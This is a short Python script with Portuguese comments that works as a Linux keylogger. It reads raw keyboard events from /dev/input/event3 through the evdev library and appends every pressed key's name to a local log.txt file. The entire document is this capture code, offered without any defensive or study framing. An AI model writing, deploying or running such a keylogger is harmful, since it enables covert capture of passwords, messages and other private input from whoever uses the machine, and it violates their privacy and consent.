import evdev
from evdev import ecodes

# captura os dispositivos do hyprland
''' devices = [evdev.InputDevice(path) for path in evdev.list_devices()]

for device in devices:
    print(device.path, device.name, device.phys) '''

# informo qual dispositivo estou fazendo a captura (pode variar a depender do computador)
device = evdev.InputDevice('/dev/input/event3')

# abro o arquivo log para armazenar as teclas capturadas
with open ("log.txt", "w") as log:
    log.write("")

# abre o loop de leitura
for event in device.read_loop():
    # mapea as teclas capturadas
    if event.type == ecodes.EV_KEY:
        key = ecodes.KEY[event.code]
        
        # confere se a tecla foi pressionada, se sim, faz a captuera
        if event.value == 1:
            with open ("log.txt", "a") as log:
                log.write(f"{key} ") # guarda nesse arquivo